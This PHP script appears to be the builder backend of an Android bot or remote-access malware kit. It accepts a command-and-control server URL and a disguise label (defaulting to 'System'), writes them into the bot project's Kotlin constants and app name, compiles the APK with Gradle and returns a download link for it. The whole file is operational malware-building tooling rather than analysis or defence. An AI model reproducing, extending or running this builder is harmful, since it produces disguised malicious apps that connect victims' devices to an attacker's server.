<?php
ini_set('max_execution_time', 900);
set_time_limit(900);
header('Content-Type: application/json');

$input = json_decode(file_get_contents('php://input'), true);
$apkName = preg_replace('/[^a-zA-Z0-9_\-]/', '', $input['apkName'] ?? 'Bot');
$appLabel = $input['appLabel'] ?? 'System';
$c2Url = $input['c2Url'] ?? '';

if (!$c2Url) {
    echo json_encode(['success' => false, 'message' => 'C2 URL is empty']);
    exit;
}

$isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
$baseDir = realpath(__DIR__ . '/../../../');

// Update Constants
$constFile = $baseDir . '/app/src/main/java/org/reddeaddeath/classicbotmazar/Constants.kt';
if (file_exists($constFile)) {
    $c = file_get_contents($constFile);
    $c = preg_replace('/val urlConnection = ".*"/', 'val urlConnection = "' . $c2Url . '"', $c);
    file_put_contents($constFile, $c);
}

// Update Strings
$strFile = $baseDir . '/app/src/main/res/values/strings.xml';
if (file_exists($strFile)) {
    $s = file_get_contents($strFile);
    $s = preg_replace('/<string name="app_name">.*<\/string>/', '<string name="app_name">' . htmlspecialchars($appLabel) . '</string>', $s);
    file_put_contents($strFile, $s);
}

$output = [];
$status = 0;

if ($isWin) {
    // Windows: Check for java in PATH and use call gradlew
    $cmd = 'cd /d ' . escapeshellarg($baseDir) . ' && call gradlew.bat assembleDebug 2>&1';
} else {
    // Linux
    $cmd = 'cd ' . escapeshellarg($baseDir) . ' && chmod +x gradlew && ./gradlew assembleDebug 2>&1';
}

exec($cmd, $output, $status);

if ($status === 0) {
    $src = $baseDir . '/app/build/outputs/apk/debug/app-debug.apk';
    $dest = __DIR__ . '/../' . $apkName . '.apk';
    if (file_exists($src) && copy($src, $dest)) {
        echo json_encode(['success' => true, 'downloadUrl' => $apkName . '.apk', 'log' => implode("\n", $output)]);
    } else {
        echo json_encode(['success' => false, 'message' => 'Copy failed', 'log' => implode("\n", $output)]);
    }
} else {
    echo json_encode(['success' => false, 'message' => 'Build error', 'log' => implode("\n", $output)]);
}
